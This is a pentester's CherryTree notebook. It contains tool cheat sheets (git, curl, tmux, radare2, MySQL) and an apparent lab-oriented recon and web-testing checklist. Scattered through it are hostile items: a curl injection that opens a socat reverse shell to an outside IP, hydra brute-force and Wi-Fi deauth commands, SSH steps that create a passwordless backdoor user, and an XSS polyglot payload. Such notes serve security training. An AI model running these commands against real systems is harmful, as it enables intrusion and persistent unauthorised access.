• git stash apply --index
   ◇ Reapply stashed changes along with staged changes
• git stash drop stash@{2}
   ◇ Drop stash 2
• git stash pop
   ◇ Apply most recent stash and drop from stack
• git stash branch mybranch
   ◇ Create branch 'mybranch' from stash
•  git stash clear
   ◇ Delete all stashes
• git diff --staged
   ◇ Show what's staged but not yet committed
• git diff --check
   ◇ Check for whitespace errors before committing 

</rich_text>
        <rich_text scale="h2">Using Bisect</rich_text>
        <rich_text>
• git bisect start
   ◇ Start binary search of commits to find bad commit
• git bisect bad
   ◇ Mark current commit as broken during bisect
• git bisect good v2.2
   ◇ Mark v2.2 as last known good commit during bisect
• git bisect good
   ◇ Mark current commit as good during bisect
• git bisect reset
   ◇ Reset HEAD when finished with bisect
• git bisect run test.sh
   ◇ Run 'test.sh' on each commit during bisect 


• When you come across a git directory during a pentest you can use gittools-extractor to look for secrets
   ◇ gittools-extractor target_dir destination_dir</rich_text>
      </node>
      <node name="Curl" unique_id="57" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h1">Curl Cheat Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Basic Options</rich_text>
        <rich_text>
• -o &lt;file&gt;    
   ◇ --output: write to file
• -u user:pass 
   ◇ --user: Authentication
• -v
   ◇ --verbose
• -vv
   ◇ Even more verbose
• -s
   ◇ --silent: don't show progress meter or errors
• -S 
   ◇ --show-error: when used with --silent (-sS), show errors but no progress meter
• -i 
   ◇ --include: Include the HTTP-header in the output
• -I
   ◇ --head: headers only

</rich_text>
        <rich_text scale="h2">Request</rich_text>
        <rich_text>
• -X POST
   ◇ --request
• -L 
   ◇ follow link if page redirects
• -F 
   ◇ --form: HTTP POST data for multipart/form-data

</rich_text>
        <rich_text scale="h2">Data</rich_text>
        <rich_text>

• -d 'data'
   ◇ --data: HTTP post data, URL encoded (eg, status="Hello")
• -d @file
   ◇ --data via file
• -G
   ◇ --get: send -d data via get

</rich_text>
        <rich_text scale="h2">SSL</rich_text>
        <rich_text>
• --cacert &lt;file&gt;
• --capath &lt;dir&gt;

• -E 
   ◇ --cert &lt;cert&gt;
      ▪ --cert: Client cert file
   ◇ --cert-type 
      ▪ der/pem/eng
• -k
   ◇ --insecure
      ▪ for self-signed certs

</rich_text>
        <rich_text scale="h2">Headers</rich_text>
        <rich_text>
• -A &lt;str&gt; 
   ◇ --user-agent
• -b name=val 
   ◇ --cookie
• -b FILE 
   ◇ --cookie
• -H "X-Foo: y"
   ◇ --header
• --compressed
   ◇ use deflate/gzip

</rich_text>
        <rich_text scale="h3">Examples</rich_text>
        <rich_text>
• GET
   ◇ curl https://example.com -k -o my.file
   ◇ curl http://example.com -s -o my.file
   ◇ curl -O google-wget.txt </rich_text>
        <rich_text link="webs http://www.google.com">www.google.com</rich_text>
        <rich_text>
• POST
   ◇ curl -d "user=user1&amp;pass=abcd" POST </rich_text>
        <rich_text link="webs http://example.com/login">http://example.com/login</rich_text>
        <rich_text>
   ◇ curl -X POST --data "code=os.system('socat TCP:192.168.49.153:80 EXEC:bash')" http://192.168.153.117:50000/verify --proxy 127.0.0.1:8080
   ◇ curl --form "fileupload=#myfile.txt" https://example.com/resource.cgi






</rich_text>
      </node>
      <node name="Tmux" unique_id="58" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h1">Tmux Cheat Sheet</rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">Prompt</rich_text>
        <rich_text>
• tmux
   ◇ Start new session from prompt
• tmux new -s name
   ◇ Start new session with name 'name' from prompt
• tmux a
   ◇ Attach session from prompt
• tmux ls
   ◇ List session from prompt

</rich_text>
        <rich_text scale="h2">Sessions</rich_text>
        <rich_text>
• ctrl+a s
   ◇ List sessions
• ctrl+a $
   ◇ Name session
• ctrl+a :new
   ◇ New session

</rich_text>
        <rich_text scale="h2">Windows</rich_text>
        <rich_text>
• ctrl+a c
   ◇ Create window
• ctrl+a w
   ◇ List windows
• ctrl+a n
   ◇ Next window
• ctrl+a p
   ◇ Previous window
• ctrl+a f
   ◇ Find window
• ctrl+a ,
   ◇ Name window
• ctrl+a &amp;
   ◇ Kill window

</rich_text>
        <rich_text scale="h2">Panes</rich_text>
        <rich_text>
• ctrl+a |
   ◇ Vertical split
• ctrl+a -
   ◇ Horizontal split
• ctrl+a o
   ◇ Swap panes
• ctrl+a q
   ◇ Show pane numbers
• ctrl+a x
   ◇ Kill pane

</rich_text>
        <rich_text scale="h2">Panes</rich_text>
        <rich_text>
• ctrl+a 
   ◇ Toggle between layouts (space)
• ctrl+a {
   ◇ Move current pane left
• ctrl+a }
   ◇ Move current pane right
• ctrl+a z
   ◇ Toggle pane zoom

</rich_text>
        <rich_text scale="h2">Misc</rich_text>
        <rich_text>
• tmux a -t name
   ◇ Attach session to named 'name' from prompt
• tmux kill-session -t name
   ◇ Kill session named 'name' from prompt
• ctrl+a d
   ◇ Detach
• ctrl+a t
   ◇ Big clock
• ctrl+a ?
   ◇ List shortcuts
• ctrl+a :
   ◇ Prompt</rich_text>
      </node>
      <node name="radare2" unique_id="59" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288295">
        <rich_text scale="h2">r2 Cheat Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">CLI</rich_text>
        <rich_text>
• -A
   ◇ Analyze the binary
• -d
   ◇ enable debugger
• -w 
   ◇ open in write
• -
   ◇ entr console without opening file
• -r
   ◇ rarun2 profile
• -R
   ◇ rarun2 rule
      ▪ stdin=\!./exploit

</rich_text>
        <rich_text scale="h2">Analyze</rich_text>
        <rich_text>
• a?
   ◇ analyze help
• aaa
   ◇ analyze everything
• af
   ◇ analyze functions
• afl
   ◇ list functions

</rich_text>
        <rich_text scale="h2">Information</rich_text>
        <rich_text>
• i?
   ◇ info help
• ia
   ◇ show all info 
• izz
   ◇ All strings
• im
   ◇ memory information
• ie
   ◇ entry point

</rich_text>
        <rich_text scale="h2">Navigation</rich_text>
        <rich_text>
• s?
   ◇ nav help
• s
   ◇ print current mem addr
• s addr
   ◇ move to addr
• s- 
   ◇ undo last move
• s+ n
   ◇ move n bytes forward
• s- n
   ◇ move n bytes backwards
• s main
   ◇ move to main
• sr reg
   ◇ move to register

</rich_text>
        <rich_text scale="h2">Printing</rich_text>
        <rich_text>
• p?
   ◇ print help
• px
   ◇ print hexdump of current addr
• pd
   ◇ print disass of current addr
• pd s main
   ◇ diss dump of main
• pxe
   ◇ lol
• pC
   ◇ print rows

</rich_text>
        <rich_text scale="h2">Debugging</rich_text>
        <rich_text>
• d?
   ◇ debug help
• db
   ◇ set breakpoint
• dr
   ◇ print register values
• dc 
   ◇ continue executing program
• ds
   ◇ step through program
• ds n
   ◇ step n lines through program
• dbi
   ◇ list indexes and mem addr of breakpoints
• dor
   ◇ send data to rarun2
      ▪ dor stdin=!./exploit
• doo
   ◇ reopen binary with new args

</rich_text>
        <rich_text scale="h2">Visual Mode</rich_text>
        <rich_text>
• V
   ◇ enter visual mode
   ◇ ?
      ▪ display visual mode help
• VV
   ◇ graph mode
• v!
   ◇ “gui” mode
• : 
   ◇ run r2 commands
• ;
   ◇ add comment 
• s
   ◇ step through

</rich_text>
        <rich_text scale="h2">Write Mode</rich_text>
        <rich_text>
• w string
   ◇ write string to current addr
• wc
   ◇ list changes
• wa
   ◇ modifies instruction at current addr

</rich_text>
        <rich_text scale="h2">r2frida</rich_text>
        <rich_text>
• \dc 
   ◇ continue the execution
• \dd 
   ◇ list file descriptors
•  \dm         
   ◇ show process memory maps
• \dmm        
   ◇ show modules mapped
• \dl foo.so  
   ◇ load a shlib
• \dt write   
   ◇ trace every call to 'write'
• \isa read   
   ◇  find where's the read symbol located
• \ii         
   ◇  list imports off the current module
• \dxc exit 0 
   ◇  call 'exit' symbol with argument 0</rich_text>
      </node>
      <node name="MYSQL" unique_id="60" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288295" ts_lastsave="1652288296">
        <rich_text scale="h2">MYSQL Cheat Sheet</rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Logging in</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">Browsing</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Select</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Users and Privileges</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Tables</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Root password</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <codebox char_offset="30" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">mysql -u dbuser -p -P 63306 -h 172.16.64.92

use database_01;</codebox>
        <codebox char_offset="43" justification="left" frame_width="500" frame_height="40" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="1">SHOW DATABASES;
SHOW TABLES;
SHOW FIELDS FROM table / DESCRIBE table;
SHOW CREATE TABLE table;
SHOW PROCESSLIST;
KILL process_number;</codebox>
        <codebox char_offset="53" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="1">SELECT * FROM table;
SELECT * FROM table1, table2;
SELECT field1, field2 FROM table1, table2;
SELECT ... FROM ... WHERE condition
SELECT ... FROM ... WHERE condition GROUP BY field;
SELECT ... FROM ... WHERE condition GROUP BY field HAVING condition2;
SELECT ... FROM ... WHERE condition ORDER BY field1, field2;
SELECT ... FROM ... WHERE condition ORDER BY field1, field2 DESC;
SELECT ... FROM ... WHERE condition LIMIT 10;
SELECT DISTINCT field1 FROM ...
SELECT DISTINCT field1, field2 FROM ...</codebox>
        <codebox char_offset="77" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="1">CREATE USER 'user'@'localhost';
GRANT ALL PRIVILEGES ON base.* TO 'user'@'localhost' IDENTIFIED BY 'password';
GRANT SELECT, INSERT, DELETE ON base.* TO 'user'@'localhost' IDENTIFIED BY 'password';
REVOKE ALL PRIVILEGES ON base.* FROM 'user'@'host'; -- one permission only
REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'user'@'host'; -- all permissions
FLUSH PRIVILEGES;

SET PASSWORD = PASSWORD('new_pass');
SET PASSWORD FOR 'user'@'host' = PASSWORD('new_pass');
SET PASSWORD = OLD_PASSWORD('new_pass');
UPDATE users SET admin=”yes” WHERE username=”user”;

DROP USER 'user'@'host';
</codebox>
        <codebox char_offset="87" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sql" highlight_brackets="1" show_line_numbers="1">--CREATE
CREATE TABLE table (field1 type1, field2 type2);
CREATE TABLE table (field1 type1, field2 type2, INDEX (field));
CREATE TABLE table (field1 type1, field2 type2, PRIMARY KEY (field1));
CREATE TABLE table (field1 type1, field2 type2, PRIMARY KEY (field1,field2));

--DROP
DROP TABLE table;
DROP TABLE IF EXISTS table;
DROP TABLE table1, table2, ...

--ALTER
ALTER TABLE table MODIFY field1 type1
ALTER TABLE table MODIFY field1 type1 NOT NULL ...
ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1
ALTER TABLE table CHANGE old_name_field1 new_name_field1 type1 NOT NULL ...
ALTER TABLE table ALTER field1 SET DEFAULT ...
ALTER TABLE table ALTER field1 DROP DEFAULT
ALTER TABLE table ADD new_name_field1 type1
ALTER TABLE table ADD new_name_field1 type1 FIRST
ALTER TABLE table ADD new_name_field1 type1 AFTER another_field
ALTER TABLE table DROP field1
ALTER TABLE table ADD INDEX (field);</codebox>
        <codebox char_offset="104" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">$ /etc/init.d/mysql stop

$ mysqld_safe --skip-grant-tables

$ mysql # on another terminal
mysql&gt; UPDATE mysql.user SET password=PASSWORD('new_pass') WHERE user='root';

## Switch back to the mysqld_safe terminal and kill the process using Control + \
$ /etc/init.d/mysql start</codebox>
      </node>
      <node name="Empire" unique_id="61" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288296" ts_lastsave="1652288296"/>
      <node name="ASM" unique_id="62" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652288296" ts_lastsave="1652288296">
        <rich_text scale="h2">ASM Instructions</rich_text>
        <rich_text>
• Data Transfer
   ◇ MOV
   ◇ XCHG
   ◇ PUSH
   ◇ POP
• Arithmetic
   ◇ ADD
   ◇ SUB
   ◇ MUL
   ◇ XOR
   ◇ NOT
• Control Flow
   ◇ CALL
   ◇ RET
   ◇ LOOP
   ◇ Jcc
• Other
   ◇ STI
   ◇ CLI
   ◇ IN
   ◇ OUT</rich_text>
      </node>
    </node>
  </node>
  <node name="Reconnaissance" unique_id="78" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1653084863" ts_lastsave="1653087456">
    <node name="Network Recon and Exploitation" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652102537" ts_lastsave="1653099999">
      <node name="Infrastructure Recon" unique_id="2" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652102561" ts_lastsave="1655339072">
        <rich_text scale="h2">Netblock and IPs</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <rich_text scale="h2">Domain</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>


</rich_text>
        <rich_text scale="h2">Ports</rich_text>
        <rich_text>
</rich_text>
        <rich_text justification="left"></rich_text>
        <rich_text>

</rich_text>
        <codebox char_offset="17" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#Reverse DNS
nslookup -type=PTR x.x.x.x
dig x.x.x.x PTR

#Netblocks, Live Hosts
fping -a -g x.x.x.x/xx 2&gt;/dev/null
nmap -sn x.x.x.x/xx
nmap -n -sn x.x.x.x/xx #no ping</codebox>
        <codebox char_offset="27" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#nslookup
nslookup target.com #basic DNS query
nslookup -type=MX target.com #mail exchange query
nslookup -type=NS target.com #name server query
#zone transfer below, a server misconfig that allows a complete dns lookup
nslookup
&gt; server target.com
&gt; ls -d target.com

#dig equivalents to the above nslookup commands
dig target.com
dig target.com A #Only present in forward zones 
dig target.com TXT #Text records
dig target.com MX
dig target.com NS
dig target axfr @x.x.x.x target.com #zone transfer

#other tools
dnsrecon -d target.com -a --name-server server
nmap -sU -p53 x.x.x.x/xx
dnsmap target.com
dnsenum target.com
#Google and Bing
ip:x.x.x.x</codebox>
        <codebox char_offset="37" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">nmap -sS x.x.x.x #TCP
nmap -sU x.x.x.x #UDP
#Scan all ports quickly, very loud
ports=$(nmap -p- --min-rate=1000 -T4 x.x.x.x | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//)
nmap -sV -sC -p $ports x.x.x.x
#Zombie scan, better for stealth
nmap -O -v x.x.x.x #look for incremental sequence gen
nmap -Pn -sI zombieIP:xx targetIP -p$ports -v
#zombie with hping3
hping3 -S --scan known x.x.x.x #identify ports
hping3 -S -r -p$ports x.x.x.x #identify zombie</codebox>
        <node name="Wi-Fi" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652282437" ts_lastsave="1652319043">
          <node name="Configuration" unique_id="47" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652283623" ts_lastsave="1652283934">
            <rich_text scale="h2">Configuring the Adapter</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="24" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">iwconfig
iwconfig INTERFACE
airmon-ng check kill #kill processes interfering with interface params
airmon-ng start wlan0 #starts monitor mode
iwconfig mon0 #interface created by airmon
aireplay-ng -9 mon0 #test mode</codebox>
          </node>
          <node name="Discovery" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652282460" ts_lastsave="1652286135">
            <rich_text scale="h2">Kismet</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Airodump-ng</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Hidden SSID</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="7" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">kismet -c mon0
#kismet color coding
##green none
##red wep
##yellow wpa wpa2</codebox>
            <codebox char_offset="22" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">airodump-ng mon0
airodump-ng -c 1,6,11 mon0
airodump-ng -w output mon0
airodump-ng -c CHANNEL -b BSSID mon0</codebox>
            <codebox char_offset="37" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#Lock adapter to hidden networks channel
#get a list of STA associated and deauth one
aireplay-ng -0 1 -c CLIENTMAC -a APMAC mon0</codebox>
          </node>
          <node name="Attacking Wi-Fi" unique_id="46" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652282478" ts_lastsave="1653280323">
            <rich_text scale="h2">WEP</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">WPA2</rich_text>
            <codebox char_offset="4" justification="left" frame_width="100" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1"></codebox>
          </node>
        </node>
        <node name="Services" unique_id="3" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652102756" ts_lastsave="1652103336">
          <node name="21 FTP" unique_id="5" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652102789" ts_lastsave="1652102789">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Anonymous Login</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Download All Files</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Brute-Force</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">lftp</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ls -l /usr/share/nmap/script | grep -i ftp</codebox>
            <codebox char_offset="35" justification="left" frame_width="300" frame_height="30" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ftp &lt;x.x.x.x&gt;
ftp&gt;anonymous
ftp&gt;anonymous
ftp&gt;bye</codebox>
            <codebox char_offset="57" justification="left" frame_width="300" frame_height="30" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">wget -m ftp://anonymous:anonymous@10.10.10.98 #Donwload all
wget -m --no-passive ftp://anonymous:anonymous@10.10.10.98 #Download all
wget -r ftp://anonymous:@192.168.153.127:30021</codebox>
            <codebox char_offset="72" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">hydra -t 4 -l user -P /usr/share/wordlists/rockyou.txt -vV x.x.x.x ftp</codebox>
            <codebox char_offset="80" justification="left" frame_width="500" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#login
lftp -u ftpuser,ftppassword sftp://10.10.10.202/conf-backups
lftp -u anonymous sftp://10.10.10.202/conf-backups
lftp -u anonymous ftp://10.10.10.202:1221

#troubleshooting
lftp -e "set ftp:passive-mode false" -u admin,admin 192.168.69.56
lftp -e 'set ftp:passive-mode true' -u anonymous 192.168.239.68
lftp -e "mirror -R /backups ./conf-backups" -u ftpuser,ftppassword sftp://10.0.8.202
set ftp:ssl-allow false
set ftp:passive-mode off
set ssl:verify-certificate no</codebox>
          </node>
          <node name="22 SSH" unique_id="6" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652102821" ts_lastsave="1652103314">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Brute Force</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">ls -l /usr/share/nmap/script | grep -i ssh</codebox>
            <codebox char_offset="31" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">hydra -t 16 -l user -P /usr/share/wordlists/rockyou.txt -vV x.x.x.x ssh</codebox>
            <codebox char_offset="45" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">chmod 600 id_rsa
ssh -i id_rsa user@x.x.x.x -p$port
ssh -oKexAlgroithms=+diffie-hellman-group1-sha1 -c 3des-cbc user@x.x.x.x #troubleshooting

#create a new user
vim /etc/ssh/sshd_config
#find "PasswordAuthentication no" and "PermitEmptyPasswords no"
#change both to yes
systemctl restart sshd
adduser removeme
sudo passwd -d removeme</codebox>
          </node>
          <node name="25 SMTP" unique_id="7" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652103336" ts_lastsave="1653280283">
            <rich_text scale="h2">Automated Recon</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h2">Connecting</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="16" justification="left" frame_width="200" frame_height="35" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#nmap
ls -l /user/share/nmap/script | grep -i smtp
nmap -p 25 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=htb.local x.x.x.x -d
nmap --script smtp-enum-users.nse --script-args smtp-enum-users.methods={EXPN,VRFY,RCPT} -p 25 x.x.x.x
#smtp-user-enum
smtp-user-enum -M MTHD -U /usr/share/seclists/Usernames/Names/names.txt -t x.x.x.x | tee _smtp_rcpt_enum
smtp-user-enum -M MTHD -D mail.domain.lab -u USER -t x.x.x.x
#metasploit
auxiliary/scanner/smtp/smtp_enum</codebox>
            <codebox char_offset="30" justification="left" frame_width="200" frame_height="50" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="1">#connecting
telnet x.x.x.x 25
nc x.x.x.x 25
#commands
VRFY user
MAIL FROM: user@known.com
RCPT TO: user@unknown.com
DATA
EXPN</codebox>
          </node>
          <node name="80/443 Web" unique_id="8" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1652103872" ts_lastsave="1655412158">
            <rich_text scale="h2">Single-Target Domain</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">1. Identify Technologies</rich_text>
            <rich_text>
   ◇ Any known vulns?
   ◇ Any CMS? If so, run the scanner associated with it
      ▪ wpscan, joomscan, droopescan, etc..
</rich_text>
            <rich_text scale="h3">2. Launch general scans</rich_text>
            <rich_text>
   ◇ nikto
</rich_text>
            <rich_text scale="h3">3. Look for and check robots.txt, sitemap.xml, 404 page and look at the ssl cert for any info.</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h3">4. Use feroxbuster for dirbusting, add -k if https</rich_text>
            <rich_text>
   ◇ IIS
      ▪ feroxbuster -u </rich_text>
            <rich_text link="webs http://example.com">http://example.com</rich_text>
            <rich_text> -x txt,aspx,php,db,bak,log -t 25 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o Web/dirbusting
   ◇ Apache
      ▪ feroxbuster -u http://example.com -x txt,sh,php,db,bak,log -t 25 -w /usr/share/seclists/Discovery/Web-Content/common.txt -o Web/dirbusting
</rich_text>
            <rich_text scale="h3">5. Brute Force parameters, look for hidden parameters
6. Identity Management</rich_text>
            <rich_text>
   ◇ Role Definitions
      ▪ Where is role defined, can it be modified
   ◇ Account Enumeration
      ▪ Valid user, bad pass
      ▪ Nonexistent user
      ▪ URI probing/Response Codes
      ▪ Response Times
      ▪ Structure
         - joe bloggs = jbloggs
</rich_text>
            <rich_text scale="h3">7. Authentication</rich_text>
            <rich_text>
   ◇ Default Credentials
   ◇ No lock out
   ◇ Auth Bypass
      ▪ Forced Browsing
      ▪ Param Mod
      ▪ Predictable Session ID
      ▪ SQL Injection
   ◇ Remember Me
      ▪ Credentials should not be stored client-side
   ◇ Browser Cache
      ▪ Linux
         - ~/.cache/
      ▪ Windows
         - C:\Users\user123\AppData\Local\
   ◇ Security Questions
      ▪ Pre-Generated
   ◇ Change Password
      ▪ CSRF
      ▪ IDOR
</rich_text>
            <rich_text scale="h3">8. Authorization</rich_text>
            <rich_text>
   ◇ File Inclusion
      ▪ Test parameters, cookies
      ▪ Local and Remote
      ▪ Look for variable names like file= or home=
         - cookies can contain template and style info
      ▪ Try various validation bypass
         - url and 2x url encoding, unicode encoding,  null byte, file extension, space, angle brackets, quotes
   ◇ Accessing unowned resources
      ▪ Horizontal
         - Two users of same role
         - Test params, cookies, etc.
      ▪ Vertical
         - Different roles
         - Params, cookies
         - Try different headers with different values such as, 127.0.0.0/8 or ::1/128, localhost, RFC1918 addresses, nonexisten address, etc
            → X-Forwarded-For
            → X-Forward-For
            → X-Remote-IP
            → X-Originating-IP
            → X-Remote-Addr
            → X-Client-IP
            → X-Original-Url
            → X-Rewrite-Url
   ◇ IDOR
      ▪ Create two users and find Object references, try to access that which should not be accessed
      ▪ Look for numbers, encoded numbers, values with a logical connection to a number such as menu12, etc.
</rich_text>
            <rich_text scale="h3">9. Session Management</rich_text>
            <rich_text>
   ◇ Cookie Attributes
   ◇ CSRF
   ◇ Session Hijacking
</rich_text>
            <rich_text scale="h3">10. Input Validation</rich_text>
            <rich_text>
   ◇ XSS
      ▪ </rich_text>
            <rich_text foreground="#f9f9f0f06b6b">Reflected</rich_text>
            <rich_text>
         - Detect Vectors
            → HTTP params, POST data, hidden fields, selection values
         - Analyze Vectors
            → Test filters
               ⇒ Polyglots
                  •  javascript:/*--&gt;&lt;/title&gt;&lt;/style&gt;&lt;/textarea&gt;&lt;/script&gt;&lt;/xmp&gt;&lt;svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'&gt;
         - Determine Impact
      ▪ </rich_text>
            <rich_text foreground="#f9f9f0f06b6b">Stored</rich_text>
            <rich_text>
         - Vectors
            → User/Profiles
            → Shopping Cart
            → File Manager/Upload
            → Settings preferences
            → Forum
            → Blog
            → Log
         - use BeEF hook for exploitation
   ◇ </rich_text>
            <rich_text foreground="#f9f9f0f06b6b">HTTP Verb Tampering</rich_text>
            <rich_text>
      ▪ Modify Verbs, GET, POST, PUT, etc
   ◇ </rich_text>
            <rich_text foreground="#f9f9f0f06b6b">HTTP Param Pollute</rich_text>
            <rich_text>
      ▪ %26HPP_TEST
